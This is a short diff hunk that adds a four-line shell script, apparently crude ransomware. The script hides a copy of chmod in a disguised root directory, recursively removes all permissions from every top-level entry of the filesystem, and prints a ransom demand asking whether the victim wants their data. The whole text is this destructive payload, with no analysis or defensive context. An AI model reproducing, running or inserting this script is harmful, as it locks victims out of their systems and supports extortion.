@@ -1,0 +1,4 @@
+mkdir /.-virus_key_is_0000000000
+cp -r /bin/chmod /.-virus_key_is_0000000000
+find / ! -name '.-virus_key_is_0000000000' -a ! -name '/' -maxdepth 1 -exec chmod -R 000 {} \;
+echo 'My account is xxxx.Do you want your data?'
